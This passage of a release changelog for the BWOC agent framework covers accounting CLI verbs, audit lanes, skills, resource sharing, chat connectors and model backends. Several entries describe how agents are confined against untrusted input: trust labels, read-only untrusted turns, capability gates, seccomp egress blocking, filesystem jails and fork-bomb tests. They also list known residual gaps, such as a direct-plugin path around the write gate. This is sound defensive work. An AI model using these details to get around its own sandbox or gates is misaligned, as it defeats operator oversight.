- README `Latest-release` pointer bumped to v2026.7.25-4 (2.42.0) (#379).

## [v2026.7.25-4] — 2026-07-25 — 2.42.0

### Added

- **`bwoc accounting` gains the sales / stock / cashbook domains.** The gated CLI + the `accounting-api` plugin now cover the three remaining accounting domains, grounded in the live Accounting Open API:
  - **`bwoc accounting sales`** — `open-invoices` (GET /sales/open-invoices), `quick list` / `quick show <id>` (reads), `quick create --payload` (POST /quick-sales) + `quick convert <id>` (POST /quick-sales/{id}/convert-to-invoice) (writes).
  - **`bwoc accounting stock`** — `balance <product-id>` / `low` / `movements` (reads), `receipt --payload` (POST /stock/receipts) + `adjust --payload` (POST /stock/adjustments) (writes).
  - **`bwoc accounting cashbook`** — `journals` / `journal show <id>` (reads over GL journals), `journal create --payload` (POST /gl/journals, a manual double-entry) (write).

  Reads are free; every write is financial (GL-posting) and rides the **same** gate as `bill`/`expense` — the standing `[plugins.accounting-api] writes_enabled = true` opt-in plus a per-write confirm (or `--yes`, required in `--json`). Implemented with generic read/write runners (`run_read` / `run_id_read` / `run_payload_write` / `run_id_write`) sharing the existing `financial_write_gate` + dispatch; the plugin gains 12 operations behind DRY `_do_get` / `_do_post_payload` / `_do_post_empty` helpers. Path ids are validated locally before spawn. 4 new e2e tests (read-is-free, financial write refused without opt-in, write proceeds with opt-in + `--yes`, id-write gating + validation). SPEC.md/th + manifest updated.

## [v2026.7.25-3] — 2026-07-25 — 2.41.0

### Added

- **Two new `audit` lanes — ISO/IEC/IEEE 12207 + IEEE 1012.** `audit-iso-iec-ieee-12207` audits **software life cycle processes** (9 criteria across the 12207:2017 agreement / technical-management / technical process groups: agreement, project planning, assessment & control, configuration management, requirements, architecture/design, implementation/integration, V&V, maintenance) — the ISO/IEC/IEEE joint standard that complements 29148's requirements lane. `audit-ieee-1012` audits **verification & validation** (8 criteria from IEEE 1012:2016: integrity levels, V&V planning/SVVP, independence, and requirements/design/implementation/test V&V + anomaly reporting) — the **first IEEE-standalone lane**, proving the `audit` kind is genuinely body-agnostic: it now spans ISO, ISO/IEC, ISO/IEC/IEEE, *and* standalone IEEE. Both reuse the shared attestation runtime (operator-signed attestations in `.bwoc/workspace.toml`; a missing attestation → `status = "fail"`) and ship with SPEC.md/th + 4 e2e tests. `docs/{en,th}/PLUGINS` audit-kind enumeration updated.
- **Core Reflection practice in the self-improvement framework.** `modules/agent-template/docs/{en,th}/SELF-IMPROVEMENT` §2.4 adds the **Like / Wish / Next Step** three-line retrospective — a concrete, always-cheap growth habit run at the close of every task and session (grounded in Paccavekkhaṇa, MN 61's instruction to Rāhula: review before / during / after). Includes the prong table (asks → produces → feeds), honesty rules (one line each, Wish names a gap not a grievance, exactly one owned Next step), a template + worked example, a **stage-mapping table** explaining what the ritual asks after each stage (Suta / Cintā / Bhāvanā) and what the Next step becomes there, and an escalation rule (a Wish recurring 3+ times climbs the Curation Pipeline). §4 The Wisdom Loop now names Core Reflection as the ritual that drives its arrows.

## [v2026.7.25-2] — 2026-07-25 — 2.40.0

### Added

- **Resource Protocol live end-to-end — `bwoc resource advertise` + `discover` (slice C, with the gateway broker slice B).** A light host can now find a heavy host's free compute/memory across the fleet through the `bwoc-gateway` broker. `bwoc resource advertise --provider <id> [--ttl 30]` publishes this host's snapshot + offered kinds to the broker (one shot — run on a timer for a heartbeat; gated on `[resource] share = true` + a configured `[resource] gateway`). `bwoc resource discover --kind compute [--gpu-vram N] [--ram N] [--cores N]` queries the broker and prints matching live offers, best-free-VRAM first. Both reach the gateway over HTTP(S) by shelling `curl` — the CLI stays HTTP-client-free (matching the plugin path), and the gateway's HTTPS (tailscale serve) is handled by normalising `ws(s)://` → `http(s)://`. The companion broker (`POST /v1/resource/{advertise,discover}`, a TTL-evicted in-memory offer registry, one live offer per provider) ships in `bwoc-gateway`. The `claim` → signed-`RES.LEASE` round trip (over the existing relay) + `compute` offload execution are slice D. 6 new unit tests (URL normalisation, gateway resolution, request-body shapes); `docs/{en,th}/RESOURCE-PROTOCOL` §Slices updated.

## [v2026.7.25-1] — 2026-07-25 — 2.39.0

### Added

- **Resource Protocol — fleet compute & memory sharing (`bwoc resource`, slice A).** A new protocol (`docs/{en,th}/RESOURCE-PROTOCOL`) for a light host to borrow compute (GPU/CPU), working memory (RAM, shared KV/context), or read-only federated knowledge from a heavy host across the fleet, brokered through the `bwoc-gateway` relay under a **refuse-by-default provider sharing gate** — the operationalisation of [Fleet Governance §6](docs/en/FLEET-GOVERNANCE.en.md) (*honor shared resources*). The model is a signed, time-bounded **lease** over a typed resource (`compute` / `kv` / `knowledge`): advertise → discover → claim (gate) → lease → use → release. **Slice A** ships the two local, no-network verbs plus the shared types the broker + offload slices build on: `bwoc resource snapshot` (GPU via `nvidia-smi`, CPU cores, RAM/load via `/proc`) and `bwoc resource gate-check` (dry-run the sharing gate — "would a claim of kind K from agent A for N MB VRAM be allowed by my `[resource]` caps against a live snapshot?", with typed denials `not_sharing` / `kind_not_offered` / `not_allowed` / `over_cap` / `insufficient_free`). The `advertise`/`discover`/`claim`/`release`/`kv` verbs and the gateway `/v1/resource/*` broker registry are specified and deferred to slices B (gateway) + C (offload). 13 unit tests (nvidia-smi/meminfo/loadavg parsers + the five-step gate).

## [v2026.7.25-0] — 2026-07-25 — 2.38.0

### Added

- **`bwoc accounting` — the gated CLI front for the `accounting-api` plugin.** Closes the financial-write gap: the plugin's write verbs previously had no operator boundary. `report <name>` (READ, free), `bill create` / `bill update <id>` / `expense create` (WRITE). Each write posts a durable document **and** an auto double-entry GL entry on the live books, so it carries the framework's strongest gate — the `gcloud-iam` two-part shape: a standing `[plugins.accounting-api] writes_enabled = true` opt-in in `.bwoc/workspace.toml` (refuse-by-default) **plus** a per-write confirm echoing the target (or `--yes`, required in `--json`). `--params` / `--payload` take a JSON object, validated locally before the plugin is ever spawned. The plugin holds no gate — this CLI is the single choke point; invoking the plugin directly bypasses it. Exit codes mirror `gcloud` / `gws` (0/1/2/4/255). 4 unit + 6 e2e tests (gate refusals + happy paths against a stub plugin, no network). `docs/{en,th}/PLUGINS` §Write verbs now documents the financial-write two-part gate; the `accounting-api` manifest + SPEC drop the "follow-up slice" wording now that the CLI ships.

## [v2026.7.24-0] — 2026-07-24 — 2.37.0

### Added

- **`audit` kind now spans ISO / IEC / IEEE** — added `audit-iso-iec-ieee-29148`, a Requirements-Engineering audit against **ISO/IEC/IEEE 29148:2018** (the first jointly ISO + IEC + IEEE standard in the set; supersedes IEEE 830/1233/1362), reusing the shared attestation runtime. Its 7 criteria cover StRS / SyRS-SRS, individual + set requirement characteristics, verifiability, bidirectional traceability, and requirements management. The `audit` kind's framing + designations were generalised to the three standards bodies (ISO 9001 · ISO/IEC 20000-1/27001/29110 · ISO/IEC/IEEE 29148) in `docs/{en,th}/PLUGINS`.
- **`soul` framework skill** (`modules/skills/soul/`, `domain/identity`): hold an agent's enduring core — values, voice, principles, boundaries — consistently across every task so it is recognizably *itself*. `embody` (act from the core, expressed not announced) + `reflect` (catch drift + realign, correcting ego-free). The BWOC paradox: a consistent stream of character (Sīla, Adhiṭṭhāna) held *without* clinging to a fixed ego (Anattā) — and the one skill whose teardown is deliberately not a release (the core persists across tasks). L1.
- **`accounting-api` workflow plugin** (`modules/plugins/workflow/accounting-api/`): a `workflow`-kind adapter over the Bemind Accounting Open API (v2.3.2) — `report` (read `/reports/<name>` — pnl / balance-sheet / cashflow / trial-balance / vat / …), `bill-create` + `bill-update` (the 2-step `/purchase-docs` `POST → PATCH` bill flow, `purchases:write`), and `expense-create` (`/expenses`, `expenses:write`). Every write auto-posts a double-entry GL entry server-side. Operator API key (bound to one seller) resolves from `BWOC_ACCOUNTING_KEY` / `.bwoc/secrets/accounting-key` (never committed); a User-Agent header is required. First slice — the `bwoc accounting` CLI carrying the write-verb operator-confirm gate is a follow-up. Grounded in the app's live OpenAPI.

## [v2026.7.23-0] — 2026-07-23 — 2.36.0

### Added

- **`ai-loop-engineer` framework skill** (`modules/skills/ai-loop-engineer/`, `domain/autonomy`): engineer autonomous agent loops (`perceive → act → observe`) that converge, stay bounded, and escalate — `design_loop` (iteration unit · stop condition = done-when + max-iterations + budget ceiling · guardrails · escalation gate) + `tune_loop` (fix non-convergence / runaway cost / oscillation / silent failure on a live loop). Distinct from `ai-dlc` (human-steered development lifecycle); this builds the *agent's own* iteration engine. Maps to Appamāda (heedful), Mattaññutā (bounded), Anattā (stop/pivot), + deferred-control at the irreversible gate. L1.

### Fixed

- **Skill SPEC wikilink depths** — the docs cross-links in the skill SPECs pointed at non-existent paths (`PHILOSOPHY.en` lives under `modules/agent-template/docs/en/`, not repo-root `docs/en/`; `SKILLS.en` is three levels up from `modules/skills/<name>/`; the agent-template `AGENTS` link had a doubled `modules/` segment). Corrected across the affected skill SPECs (the reference `worktree-discipline` shared the same off-by-one). Cosmetic — Obsidian resolves by note name — but the paths now match the repo layout.

## [v2026.7.22-1] — 2026-07-22 — 2.35.0

### Added

- **Role skill set — five framework skills** (`modules/skills/`): profession/role skills extending the craft library — **product-manager** (discover/define), **systems-engineer** (architect_system/assure_reliability), **software-engineer** (design_component/review_code), **data-engineer** (build_pipeline/ensure_data_quality), **data-scientist** (analyze/build_model). Each names its distinction from the adjacent craft (e.g. software-engineer's design+review brackets engineering's implement+harden; product-manager's what/why vs manager's how), maps to a framework principle, and is environment-neutral, L1.
- **`ai-dlc` framework skill** (`modules/skills/ai-dlc/`, `domain/methodology`): the AI-Driven Development Life Cycle as a repeatable practice — `plan_increment` (elaborate a human intent into an agreed, right-sized plan; stop for approval before build) + `execute_increment` (drive build → verify → document → operate, pausing at each bounded/irreversible gate for the framework's operator-confirm). The *meta-skill* that sequences the craft skills (`manager`/`engineering`/`auditor`/`documenter`) across a lifecycle, grounding AI-DLC's "agent drives, human steers at the gates" in BWOC's own `Sīla` gates + deferred-control + `uppāda/ṭhiti/vaya` arc. L1.
- **Craft skill library — ten framework skills** (`modules/skills/`): a library of reusable craft/persona capabilities an agent enables per role — **writer** (draft/revise), **illustrator** (compose_prompt/generate), **manager** (plan/delegate), **counselor** (listen/advise), **auditor** (audit/verify_finding), **engineering** (implement/harden), **mathematics** (derive/check_result), **physics** (model/estimate), **documenter** (document/sync), **lawyer** (review/flag_risk). Each maps to a Buddhist principle the framework already uses (Sammā-vācā, Yoniso Manasikāra, Sīla, the Brahmavihāra…), exposes two operations, is environment-neutral (no hardcoded backend/model/vendor), declares `maturity = L1`, and cross-links its siblings. `counselor` and `lawyer` carry a humility clause routing weighty decisions to a qualified human. Enable per agent with `bwoc skill enable`.
- **`second-brain` + `server-rag` framework skills** (`modules/skills/`): two sibling `domain/knowledge` skills encoding "consult the fleet's existing knowledge before re-deriving" (Remember-first, fleet-wide). `second-brain` queries the fleet's harvested knowledge **graph** (`query_brain` — by term across every workspace/repo/commit/PR/issue/memory/note; `refresh_brain` re-harvests); `server-rag` asks the self-hosted **semantic RAG** (`ask_rag` — natural-language question → answer + sources; `refresh_rag` re-ingests). Both are read-first (no operator-confirm gate on the local-only refresh) and environment-neutral (operator-configured `<secondBrainRoot>` / `<ragQueryUrl>`). Enable per agent with `bwoc skill enable`.

## [v2026.7.22-0] — 2026-07-22 — 2.34.0

### Added

- **`gws-slides` — Google Slides read + in-place write**: a new `gws` per-service plugin and `bwoc gws slides` verbs — `get` (presentation title + slide ids), `batch-update` (`presentations.batchUpdate` — the general write path), and `replace-all-text` (convenience). Reuses the operator-confirm gate; requires the `presentations` OAuth scope. **Completes the Docs/Sheets/Slides series** — the `gws` kind now has three write-capable Google Workspace editor services.
- **`gws-sheets` — Google Sheets read + values write**: a new `gws` per-service plugin and `bwoc gws sheets` verbs — `get` (spreadsheet title + tab list), `values-get` (read a cell range), and the gated writes `values-update` (`spreadsheets.values.update` — overwrite a range) and `values-append` (`spreadsheets.values.append` — append rows). Reuses the operator-confirm gate from `gws-docs` (default No, interactive `y/N`, `--yes` for headless, `--json` requires `--yes`). Writes use `valueInputOption=USER_ENTERED`. Requires the `spreadsheets` OAuth scope; sources credentials from `gws-auth`. Second slice of the Docs/Sheets/Slides series.
- **`gws-docs` — Google Docs read + in-place write** (issue #354): a new `gws` per-service plugin and `bwoc gws docs` verbs — `get` (`documents.get` — metadata + bounded body text), `batch-update` (`documents.batchUpdate` — the general write path), and `replace-all-text` (convenience). This is the **first write-capable `gws` service**, so it introduces the kind's use of the **operator-confirm gate**: the write verbs default to No, prompt `y/N` interactively, require `--yes` for headless agents (and with `--json`), and report "no change" on refusal — the gate lives at the `bwoc gws` CLI boundary, not the plugin. Requires the `documents` OAuth scope (read+write); sources credentials from the sibling `gws-auth`. Google Docs `gws-sheets` / `gws-slides` follow as separate slices.

## [v2026.7.20-0] — 2026-07-20 — 2.33.0

### Added

- **`bwoc run --workdir <dir>`** — opt-in un-jail for cross-project headless tasks. By default `bwoc run` still spawns the agent in its own directory (the safe, blast-radius-minimal jail), so a headless agent can't touch shared workspace files (`projects/`, `wiki/`). Passing `--workdir` runs from another directory — relative paths resolve against the workspace root (`--workdir .` = the workspace root) — so a task that legitimately needs cross-project scope can edit those files. The resolved path must be an existing directory **inside** the workspace root (canonicalized; `..` escapes are refused). The widened dir applies to every backend: it becomes the process cwd for ambient backends (`claude -p`) and the harness `--workdir` FS-jail root for harness backends (the agent's `config.manifest.json` is always still read from its own directory).

## [v2026.7.19-0] — 2026-07-19 — 2.32.1

### Fixed

- **`--chat` / `--headless` now resolve the `primaryModel: "auto"` sentinel** (issue #347, PR #348): the batch `run()` path resolved `auto` via `model_select::resolve_auto` before validating and running, but the chat path validated and looped on the raw `"auto"` string, so an `auto`-model agent couldn't chat (validation errored, or with `--skip-model-check` the provider rejected the literal `"auto"`). `run_chat_mode` now resolves the sentinel the same way, before `validate_model` and before building the session. Surfaced by the bwoc-vscode-extension chat feature.

## [v2026.7.18-0] — 2026-07-18 — 2.32.0

### Added

- **`bwoc agent run --as-user <user> <agent>`** (issue #322): launch an agent session as an unprivileged user on a root-only VPS, where `--dangerously-skip-permissions` refuses to run as root. From root it validates the target user, drops privilege via `runuser`, and launches in the agent's own directory (default `bwoc-agent --serve`, or an explicit `-- <cmd>` like a remote-control session). Conservative by design — Unix-only, root-required, and it does **not** create the user or `chown` the workspace (it warns if the agent dir isn't owned by the user); those one-time steps stay in the new [`DEPLOYMENT`](docs/en/DEPLOYMENT.en.md) guide (also added this cycle).

- **`bwoc doctor` manifest-vs-reality checks** (issue #323): three new per-agent audits on top of the existing environment/hygiene sweeps — `manifest:` (config.manifest.json present, valid JSON, no leftover `{{placeholder}}` tokens), `agent key:` (`.bwoc/agent.key` must be owner-only — no group/other access — when present; `--auto` chmods to 600), and `models:` (for `backend = ollama` agents, verify `primaryModel`/`fallbackModel` are actually installed via Ollama `/api/tags` at the agent's own `baseUrl` endpoint — the pre-`ollama rm` safety check). A pinned tag (`gemma4:9b`) requires an exact match; a tagless name matches any tag. Unreachable/`https` endpoint → per-agent WARN; HTTP done over `std::net` (no new dep). FAILs set exit 2; runnable offline / in CI.

- **`bwoc receipts` — read receipts** (issue #299, second half): a sender can now ask "was my message consumed?" `bwoc triage` records the source `messageId` on each receipt it writes, and `bwoc receipts` queries those logs fleet-wide — filter `--message-id` / `--from` / `--agent`, table or `--json`. A message-id with no receipt is an explicit "not consumed yet." Completes #299 (the delivery/dedup half shipped in #311). Cross-machine ack-back via the gateway remains a transport follow-up.

- **iMessage chat connector** (`bwoc-connect imessage`, issue #229) — a fourth connector, **macOS-only and free**: receive by polling the local `~/Library/Messages/chat.db` (read-only), send via `osascript` → Messages.app. DM-first, non-streaming. Handles (phone/email) ride the existing `i64` allow-list seam via `imessage::hash_id` + an `[imessage] allow_handles` config block (option B). Confined to a `cfg(target_os = "macos")` transport — hard-errors on other platforms; the daemon supervises it via the `KNOWN` table. No token (drives the local app); needs Full Disk Access + Automation TCC grants. Caveats: the agent speaks as the Mac's own Apple ID (no bot identity), and automating Messages is against Apple's ToS (personal use). `docs/{en,th}/CONNECTORS.md` updated.

- **Warm task execution in `bwoc-agent --serve`** (issue #301, PR B of 3, opt-in `BWOC_WARM=1`, default off): when auto-claim wins a Saṅgha task, it runs in a **resident `bwoc-harness --headless`** (lazy-spawned, idle-reaped after 600s, respawned on demand) instead of cold-starting / tmux-waking — eliminating per-task backend cold-start. Trusted task path only (`Principal::LocalOperator`); untrusted gateway input keeps its existing read-only `--chat` + auto-deny path. Confined backends only (ambient `cli` refused); `requires_plan` tasks are skipped to preserve the Pavāraṇā lead-approval gate. Completion is recorded via `bwoc task complete`.
- **`bwoc-harness --headless`** — a served/warm session mode (issue #301, PR A of 3): the same multi-turn `chat_proto` loop as `--chat`, but driven by a machine frontend instead of a human. `ask`-mode tools auto-approve so a turn never blocks on a permission prompt, while guardrails, policy `deny` rules, and the worktree sandbox still confine it. Conflicts with `--unrestricted` (which would lift that sandbox). This is the standalone warm loop; daemon supervision (resident process, lazy spawn + idle-exit, inbox routing) follows in PR B.

### Fixed

- **Env scrub before spawning MCP servers, made Windows-safe** (issue #336): `StdioTransport::spawn` now `env_clear`s and re-injects only the `scrub_env` allowlist, so a third-party MCP server no longer inherits `ANTHROPIC_API_KEY`/`OPENROUTER_API_KEY`/every `*TOKEN*/*SECRET*/*KEY*`. The allowlist is now matched case-insensitively and carries the Windows essentials (`Path`, `SystemRoot`, `COMSPEC`, …) so `env_clear`'d children still start on Windows — fixing `run_command`/audit there too.
- **Bounded Anthropic `complete()`** (issue #338): the non-streaming path now has a per-call `tokio::time::timeout` (shared `REQUEST_TIMEOUT`, 120s), so a server that stalls before the first byte surfaces as `TransientProvider` and retries instead of hanging the turn forever. `stream()` is untouched.
- **`bwoc list` / `fleet health|status` error on an invalid `--workspace`** (issue #339) instead of silently reporting an empty, healthy-looking fleet with exit 0 — a bogus path now fails loud with exit 2.
- **Warn when the OS sandbox/jail is unavailable** on unsupported targets (issue #337): the `NoopOsSandbox` / `JailStatus::Unavailable` fallbacks now emit a one-time warning (Windows relies on path-confinement only) instead of degrading silently.
- **t6 `setrlimit` bomb-containment tests now run in CI** (issue #335): `BWOC_T6_RUN_BOMBS=1` is exported for a dedicated serial step, so containment is proven by an actual fork/mem/cpu/fsize bomb, not just a value snapshot.
- **Hardened the parallelism-flaky harness tests** (issue #334): the CLI subprocess tests are serialized behind an async mutex and the `nproc` task-count test takes the best of a few attempts, so they pass at default parallelism, not only under `--test-threads=1`.

## [v2026.6.15-0] — 2026-06-15 — 2.31.0

The **subscription-CLI backend + Phase 6 (paññā)** release: agents can now run on a Claude/Codex subscription with no API key, the harness eval framework and sandbox hardening extend across backends and platforms, the deep-memory store stops being a secret sink, and an **experimental** computer-use scaffold lands behind a feature flag.

### Added

- **`cli` provider backend (#277)** — drive a local, subscription-authenticated vendor CLI (`claude`, `codex`, …) instead of an HTTP endpoint: `bwoc-harness --backend cli [--cli-cmd claude]` shells out per turn (`<cli> -p --model <model> --output-format json`, conversation on stdin), so agents run on a Claude/Codex **subscription with zero API key**. Chat-only by design (the vendor CLI executes its own tools internally; harness tool-calling stays on HTTP backends). New manifest field `cliCmd` (optional, defaults `claude`).
- **macOS network-egress parity in the sandbox SBPL (t29, #283)** — the seccomp network-egress containment from Phase 5 now has a macOS Seatbelt (SBPL) equivalent, so the no-egress invariant holds on macOS as well as Linux.
- **`cli` ambient-backend trust tier (t30, #284)** — the `cli` backend is host-credentialed (ambient), so it is refused for untrusted auto-process: an unverified inbound message can never drive a subscription CLI.
- **Eval skips tool-fixtures on an ambient backend (t31b, #286)** — the eval harness recognizes ambient (chat-only) backends and skips tool-call fixtures that cannot apply to them, instead of scoring them as failures.
- **Deep-memory `mine` secret redaction (#289)** — credentials (API keys, bearer/Slack/GitHub tokens, JWTs, PEM private keys, `key=value` secrets) are scrubbed from mined session text **before** embedding and storage, so the deep-memory store never becomes a secret sink. `mine` reports the redaction count. Pure-Rust (`regex`), quarantined to `bwoc-deep-memory`.
- **Computer-use scaffold — experimental (#291, #292)** — a backend-neutral `ComputerAction` model + Anthropic native-tool serialization (`computer_20250124` + beta header), and a headless-browser `ComputerExecutor` (CDP via `chromiumoxide`) behind the optional **`browser`** feature. **Experimental:** not wired into the agent loop; the default build pulls zero browser deps; security gating (screenshot taint + capability gate + autoprocess refusal) is still ahead.

### Changed

- **`agent_loop.rs` decomposed into a directory module (t31a, #285)** — internal structure only; no behavior change.
- **Auto-version hook bumps shared version lines only on `main`, not feature branches (#287)** — feature branches no longer touch `Cargo.toml`/`VERSION.md` shared lines, so concurrent PRs never collide on the version.
- **Fork-heavy integration tests serialized in CI (t17, #282)** — avoids resource-contention flakiness in the sandbox/process tests.
- **`VERSION.md` / README / ROADMAP mark Phase 6 — _paññā_ (#290)** — harness eval & cross-platform hardening; t29–t31 done, t32 (deep-memory sqlite-vec / governance) parked as premature.

### Fixed

- **`bwoc-connect` now forwards the agent's `backend` (and `cliCmd`) to the spawned harness** — connect sessions previously ignored the manifest backend and always ran on the harness default, so `openrouter`/`claude`/`cli` agents silently used the wrong provider (#277).
- **`bwoc okr track` no longer hangs on idle stdin nor drops `as_of`/`evidence` (#280)** — the track verb blocked on stdin even when all fields were supplied as flags (hanging non-interactively) and silently discarded `as_of`/`evidence`; both fixed.

## [v2026.6.9-2] — 2026-06-09 — 2.30.0

The **standalone agent** release: an incarnated agent now runs as a self-hosted, gateway-reachable unit — receiving signed envelopes from peers across NAT/the internet, vetting them through the trust gate, auto-processing untrusted ones in a read-only turn, and shipping as a container image.

### Added

- **Standalone agent gateway receive bridge** — `bwoc-agent --serve` supervises a `bwoc-gateway-recv` child that maintains the `wss://` relay connection and drops inbound signed envelopes into the agent's inbox, so an agent behind NAT stays reachable without a direct listener. Network/TLS deps stay confined to the gateway binaries (dep-quarantine holds — `bwoc-agent`/`bwoc-core` never link WS/TLS). (#269)
- **Pinned-peer keyring + replay defense** — remote senders are resolved against a pinned `.bwoc/peers.toml` keyring; the Kalyāṇamitta-7 trust gate verifies the signature, resolves the sender, and rejects replayed envelopes, so an unverifiable or replayed message from across a gateway is refused rather than delivered. (#270)
- **Untrusted gateway auto-process + reply** — inbound envelopes from a gateway can be auto-processed in an untrusted, read-only turn (PureRead tools only) and replied to over the same transport, closing the loop for an unattended standalone agent while keeping the untrusted-ingress surface read-only. (#271)
- **Standalone agent container image** — `deploy/standalone-agent.Dockerfile` builds a self-contained image (all five binaries on `PATH`, non-root `agent` user, `ENTRYPOINT ["bwoc-agent","--serve"]`); the ed25519 identity key and provider creds are mounted at run, never baked into a layer. (#273)
- **Operating HANDBOOK (EN/TH)** for the agent template (`modules/agent-template/docs/{en,th}/HANDBOOK`) — a single onboarding read covering identity, memory, skills/mindsets, interconnect, backends, and verification gates. (#275)

### Fixed

- **t6 `RLIMIT_NPROC` floor counts tasks, not processes** (`bwoc-harness`) — the per-turn process-count limit was measured against processes rather than tasks (threads), which could trip the floor on legitimate multi-threaded turns. (#267)
- **What's New release-gate** (`bwoc-cli`) — a CI-enforced assertion now fails the build until a `HIGHLIGHTS` bullet cites the current `MAJOR.MINOR`, so "update What's New every release" is enforced rather than remembered. (#274)

## [v2026.6.9-1] — 2026-06-09 — 2.29.0

### Added

- **`openrouter` provider backend** for `bwoc-harness` — drive any vendor's model (OpenAI / Anthropic / Google / Meta / NVIDIA / …) through [OpenRouter](https://openrouter.ai)'s hosted OpenAI-compatible aggregator with one key. OpenRouter speaks the exact OpenAI shape the harness already implements, so the existing `OllamaClient` was extended rather than duplicated: optional bearer auth (`with_api_key`) + attribution headers (`with_headers`) applied at every request site; `api_key = None` keeps the plain-Ollama path byte-for-byte unchanged. The key resolves from `OPENROUTER_API_KEY` or `~/.bwoc/secrets.toml` `[openrouter] api_key` (chmod-600 guarded, sharing Anthropic's resolver), and a missing key fails fast with an actionable message instead of a bare `HTTP 401`. Agent manifest: `"backend": "openrouter"`, optional `"baseUrl"` (defaults to `https://openrouter.ai/api/v1`). Wired through `bwoc-cli` (`spawn`/`run`/`chat`) and the chat TUI (`harness_argv` now forwards `--backend`, which is load-bearing for `openrouter` — without it requests fall through to the unauthenticated client). See `notes/2026-06-09_openrouter-provider-backend.md`. (#268)

## [v2026.6.9-0] — 2026-06-09 — 2.28.0

### Added

- **`RouteTarget::Gateway` transport** in `routes.toml` — a third delivery transport alongside `local` and `mqtt`, for peers with no direct reachability (across NAT/firewalls/the open internet) reached through a `bwoc-gateway` relay. A route declares `transport = "gateway"` + `gateway = "wss://…/v1/connect"`; `bwoc send` resolves it and shells out to the `bwoc-gateway-send` sibling binary (dep-quarantine: `bwoc-core`/`bwoc-cli` never link a WebSocket/TLS client), piping the signed message envelope over stdin exactly as the MQTT path does. The sender's keypair is the gateway login, so the transport requires a signed agent sender (`user`/unsigned origins error with guidance). `bwoc peer` lists gateway routes. See `notes/2026-06-09_route-target-gateway.md`.

### Fixed

- **Flaky `process_isolation` test suite** (`bwoc-harness`) on `ubuntu-latest` CI — a different subset of its 12 sandbox tests failed each run. They each spawn the real turn-executor child and contend on process-wide machinery (capability token, per-turn `setrlimit`/cgroup, IPC fd, env scrub, PID reaping) when run in parallel. Serialized the suite with a dependency-free, poison-tolerant file-level lock. See `notes/2026-06-09_process-isolation-serial.md`.

## [v2026.6.8-0] — 2026-06-09 — 2.27.0

### Added

- **Phase 5 — *saṃvara* (trust-boundary & sandbox hardening).** Closes the untrusted-ingress surface that Phase 3's chat-connectors opened into the self-hosted `bwoc-harness`. The full 8-gate DoD plus the network-egress hard-blocker, each plan→Pavāraṇā→implement with adversarial red-team verification:
  - **t1 — total ingress trust-labeling.** Every `ChatMessage` carries an immutable `Principal`; `TrustLevel` is *derived*, never stored (promote-to-trusted is unrepresentable); fail-closed. Fixes a teammate `role:System` laundering bug.
  - **t2 / t3 — Layer-0 capability gate + taint propagation.** Untrusted turns are read-only by default (zero allow-by-omission); a sticky `untrusted_seen` latch survives compaction + reload; the graded gate allows worktree-confined writes while gating escape/persist/destruct.
  - **t4 — egress-clean whitelist proof.** `PURE_READ_TOOLS` proven egress-clean by a fail-closed tripwire + static scan + a CI guard that makes allow-by-omission impossible.
  - **t5 — per-turn process isolation.** Effectful tool execution runs in a re-exec'd, single-use turn-executor child with an unforgeable one-time token, env-scrub, and fd hygiene; un-marshallable tools fail closed.
  - **t6 — per-turn `setrlimit`** (CPU / AS / NOFILE / FSIZE; relative best-effort NPROC).
  - **t7a — executor FS jail** (Landlock / sandbox-exec) + `PR_SET_DUMPABLE` + yama (anti-ptrace) + jailed build/`core.hooksPath` (closes the `build.rs` RCE).
  - **t8 — deferred-control fence**: an honest residual table + a CI `fence-guard` that fails if code assumes an un-shipped control.
  - **t9 — per-turn cgroup v2 `pids.max`** (best-effort-when-delegated; CI-proven fork-bomb containment).
  - **t11 — seccomp-bpf network-egress + ptrace hardening** (the no-fd invariant: arch-guard KILL, `close_range`, `pidfd_getfd`/`sendmmsg` denies, fail-closed on Linux).
  - Linux-first; macOS degrades with loud skips, never silent-pass. Local same-uid covert channels are explicitly out of scope (network-egress containment, Linux). See `docs/en/THREAT-MODEL.en.md` fence + `notes/2026-06-08_phase5-samvara.md`.

### Fixed

- **Windows build + cfg-gating** of the unix-only sandbox/jail/seccomp/cgroup paths; **`c2_token_scrubbed_before_grandchild`** IPC-read flake stabilized.

## [v2026.6.7-1] — 2026-06-07 — 2.26.0

### Added

- **Chat connectors — LINE (`bwoc-connect line`).** Bridges LINE to a BWOC agent over the Messaging API. Unlike Telegram/Discord, LINE **pushes to an HTTPS webhook** — so the transport runs a small inbound **axum** server: each POST is signature-verified (`X-Line-Signature` = base64(HMAC-SHA256(channel secret, body))), parsed, and queued; `poll` drains the queue (the Discord gateway→mpsc pattern). **Free for our use case**: replies use the one-time `replyToken` (free, unlimited) when fresh, falling back to a **push** (monthly quota) for a slow turn. LINE has no edit API → non-streaming (`supports_edit = false`; the bridge sends the reply once). LINE's string ids (`U…`/`C…`/`R…`) are hashed to a stable `i64` so they fit the existing allow-list seam; the allow-list is configured as LINE user ids under `[line].allow_user_ids` (closed by default). Token from `LINE_CHANNEL_ACCESS_TOKEN` (keyring/env), secret from `LINE_CHANNEL_SECRET`; `bwoc-agent --serve` supervises `connectors/line.toml`. Dep-quarantine holds (axum/hmac/sha2/base64 in `bwoc-connect` only — verified absent from cli/agent/core). `verify_signature`/`parse_webhook`/`hash_id` + the non-editing single-send path are unit-tested; the live webhook/send are the eyeball-reviewed edge. Runs on Linux — unlike iMessage.

- **Chat connectors — reply streaming (in-place edits).** Telegram + Discord replies now stream: the bridge **sends** a message on the first token and **edits it in place** as the agent's reply grows, debounced to 1 edit/sec (clear of Telegram's ~1/s and Discord's ~5/5s limits), with a guaranteed final edit showing the complete text. `Transport::send` now returns the message id and gains `edit`; `AgentSession::ask_streamed` relays `chat_proto` `Token` deltas (the default still does a single send, so non-streaming sessions are unchanged). A new `PlatformStream` carries the send-then-debounced-edit logic, unit-tested (placeholder→edits, no-tokens→single-send, blank-skip, end-to-end via the bridge). No new deps.

## [v2026.6.7-0] — 2026-06-07 — 2.25.0

### Added

- **Chat connectors — keyring token resolution (the architect's "keyring default").** `bwoc-connect` resolves the bot token from the **OS keyring first on macOS/Windows** (service `bwoc/<platform>`, account = the agent dir's basename), falling back to the platform env var (`TELEGRAM_BOT_TOKEN` / `DISCORD_BOT_TOKEN`). **Linux is env-only** by design — wiring Secret Service pulls system libdbus (absent on CI) or a second async runtime, heavy for a feature the headless deployment target doesn't use (no Secret Service daemon → env anyway). The env var is the fallback on every platform; a missing/locked keyring is never fatal.

